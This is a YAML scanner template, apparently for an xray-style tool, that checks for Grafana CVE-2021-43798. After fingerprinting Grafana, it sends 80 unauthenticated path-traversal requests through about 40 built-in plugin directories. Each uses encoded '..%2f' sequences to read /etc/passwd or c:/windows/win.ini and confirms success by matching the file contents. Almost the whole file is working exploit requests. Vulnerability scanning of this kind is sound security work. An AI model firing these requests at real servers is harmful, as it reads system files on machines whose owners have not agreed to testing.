name: poc-yaml-grafana-cve-2021-43798-unauth-fileread
binding: dc600518-6a70-4d7c-bf3f-a9ed8b4ece70
manual: true
detail:
    author: jae
    links:
        - https://twitter.com/hacker_/status/1467880514489044993
    vulnerability:
        id: CT-194386
        level: high
transport: http
rules:
    detect:
        request:
            cache: false
            method: GET
            path: /
            follow_redirects: true
        expression: |
            response.status == 200 && "window.grafana[b|B]oot[d|D]ata\\s*=\\s*{".bmatches(response.body) || response.body.bcontains(b"Sometimes restarting grafana-server can help")
    r0:
        request:
            cache: true
            method: GET
            path: /public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r1:
        request:
            cache: true
            method: GET
            path: /public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r2:
        request:
            cache: true
            method: GET
            path: /public/plugins/annolist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r3:
        request:
            cache: true
            method: GET
            path: /public/plugins/annolist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r4:
        request:
            cache: true
            method: GET
            path: /public/plugins/grafana-azure-monitor-datasource/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r5:
        request:
            cache: true
            method: GET
            path: /public/plugins/grafana-azure-monitor-datasource/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r6:
        request:
            cache: true
            method: GET
            path: /public/plugins/barchart/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r7:
        request:
            cache: true
            method: GET
            path: /public/plugins/barchart/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r8:
        request:
            cache: true
            method: GET
            path: /public/plugins/bargauge/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r9:
        request:
            cache: true
            method: GET
            path: /public/plugins/bargauge/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r10:
        request:
            cache: true
            method: GET
            path: /public/plugins/cloudwatch/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r11:
        request:
            cache: true
            method: GET
            path: /public/plugins/cloudwatch/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r12:
        request:
            cache: true
            method: GET
            path: /public/plugins/dashlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r13:
        request:
            cache: true
            method: GET
            path: /public/plugins/dashlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r14:
        request:
            cache: true
            method: GET
            path: /public/plugins/elasticsearch/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r15:
        request:
            cache: true
            method: GET
            path: /public/plugins/elasticsearch/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r16:
        request:
            cache: true
            method: GET
            path: /public/plugins/gauge/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r17:
        request:
            cache: true
            method: GET
            path: /public/plugins/gauge/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r18:
        request:
            cache: true
            method: GET
            path: /public/plugins/geomap/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r19:
        request:
            cache: true
            method: GET
            path: /public/plugins/geomap/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r20:
        request:
            cache: true
            method: GET
            path: /public/plugins/gettingstarted/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r21:
        request:
            cache: true
            method: GET
            path: /public/plugins/gettingstarted/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r22:
        request:
            cache: true
            method: GET
            path: /public/plugins/stackdriver/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r23:
        request:
            cache: true
            method: GET
            path: /public/plugins/stackdriver/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r24:
        request:
            cache: true
            method: GET
            path: /public/plugins/graph/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r25:
        request:
            cache: true
            method: GET
            path: /public/plugins/graph/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r26:
        request:
            cache: true
            method: GET
            path: /public/plugins/graphite/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r27:
        request:
            cache: true
            method: GET
            path: /public/plugins/graphite/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r28:
        request:
            cache: true
            method: GET
            path: /public/plugins/heatmap/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r29:
        request:
            cache: true
            method: GET
            path: /public/plugins/heatmap/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r30:
        request:
            cache: true
            method: GET
            path: /public/plugins/histogram/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r31:
        request:
            cache: true
            method: GET
            path: /public/plugins/histogram/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r32:
        request:
            cache: true
            method: GET
            path: /public/plugins/influxdb/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r33:
        request:
            cache: true
            method: GET
            path: /public/plugins/influxdb/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r34:
        request:
            cache: true
            method: GET
            path: /public/plugins/jaeger/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r35:
        request:
            cache: true
            method: GET
            path: /public/plugins/jaeger/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r36:
        request:
            cache: true
            method: GET
            path: /public/plugins/logs/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r37:
        request:
            cache: true
            method: GET
            path: /public/plugins/logs/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r38:
        request:
            cache: true
            method: GET
            path: /public/plugins/loki/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r39:
        request:
            cache: true
            method: GET
            path: /public/plugins/loki/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r40:
        request:
            cache: true
            method: GET
            path: /public/plugins/mssql/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r41:
        request:
            cache: true
            method: GET
            path: /public/plugins/mssql/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r42:
        request:
            cache: true
            method: GET
            path: /public/plugins/mysql/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r43:
        request:
            cache: true
            method: GET
            path: /public/plugins/mysql/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r44:
        request:
            cache: true
            method: GET
            path: /public/plugins/news/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r45:
        request:
            cache: true
            method: GET
            path: /public/plugins/news/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r46:
        request:
            cache: true
            method: GET
            path: /public/plugins/nodeGraph/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r47:
        request:
            cache: true
            method: GET
            path: /public/plugins/nodeGraph/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r48:
        request:
            cache: true
            method: GET
            path: /public/plugins/opentsdb/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r49:
        request:
            cache: true
            method: GET
            path: /public/plugins/opentsdb/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r50:
        request:
            cache: true
            method: GET
            path: /public/plugins/piechart/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r51:
        request:
            cache: true
            method: GET
            path: /public/plugins/piechart/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r52:
        request:
            cache: true
            method: GET
            path: /public/plugins/pluginlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r53:
        request:
            cache: true
            method: GET
            path: /public/plugins/pluginlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r54:
        request:
            cache: true
            method: GET
            path: /public/plugins/postgres/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r55:
        request:
            cache: true
            method: GET
            path: /public/plugins/postgres/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r56:
        request:
            cache: true
            method: GET
            path: /public/plugins/prometheus/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r57:
        request:
            cache: true
            method: GET
            path: /public/plugins/prometheus/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r58:
        request:
            cache: true
            method: GET
            path: /public/plugins/stat/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r59:
        request:
            cache: true
            method: GET
            path: /public/plugins/stat/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r60:
        request:
            cache: true
            method: GET
            path: /public/plugins/state-timeline/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r61:
        request:
            cache: true
            method: GET
            path: /public/plugins/state-timeline/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r62:
        request:
            cache: true
            method: GET
            path: /public/plugins/status-history/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r63:
        request:
            cache: true
            method: GET
            path: /public/plugins/status-history/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r64:
        request:
            cache: true
            method: GET
            path: /public/plugins/table/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r65:
        request:
            cache: true
            method: GET
            path: /public/plugins/table/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r66:
        request:
            cache: true
            method: GET
            path: /public/plugins/table-old/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r67:
        request:
            cache: true
            method: GET
            path: /public/plugins/table-old/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r68:
        request:
            cache: true
            method: GET
            path: /public/plugins/tempo/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r69:
        request:
            cache: true
            method: GET
            path: /public/plugins/tempo/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r70:
        request:
            cache: true
            method: GET
            path: /public/plugins/testdata/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r71:
        request:
            cache: true
            method: GET
            path: /public/plugins/testdata/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r72:
        request:
            cache: true
            method: GET
            path: /public/plugins/text/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r73:
        request:
            cache: true
            method: GET
            path: /public/plugins/text/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r74:
        request:
            cache: true
            method: GET
            path: /public/plugins/timeseries/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r75:
        request:
            cache: true
            method: GET
            path: /public/plugins/timeseries/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r76:
        request:
            cache: true
            method: GET
            path: /public/plugins/welcome/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r77:
        request:
            cache: true
            method: GET
            path: /public/plugins/welcome/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
    r78:
        request:
            cache: true
            method: GET
            path: /public/plugins/zipkin/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r79:
        request:
            cache: true
            method: GET
            path: /public/plugins/zipkin/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
        expression: |
            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
expression: |
    detect() && (r0() || r1() || r2() || r3() || r4() || r5() || r6() || r7() || r8() || r9() || r10() || r11() || r12() || r13() || r14() || r15() || r16() || r17() || r18() || r19() || r20() || r21() || r22() || r23() || r24() || r25() || r26() || r27() || r28() || r29() || r30() || r31() || r32() || r33() || r34() || r35() || r36() || r37() || r38() || r39() || r40() || r41() || r42() || r43() || r44() || r45() || r46() || r47() || r48() || r49() || r50() || r51() || r52() || r53() || r54() || r55() || r56() || r57() || r58() || r59() || r60() || r61() || r62() || r63() || r64() || r65() || r66() || r67() || r68() || r69() || r70() || r71() || r72() || r73() || r74() || r75() || r76() || r77() || r78() || r79())
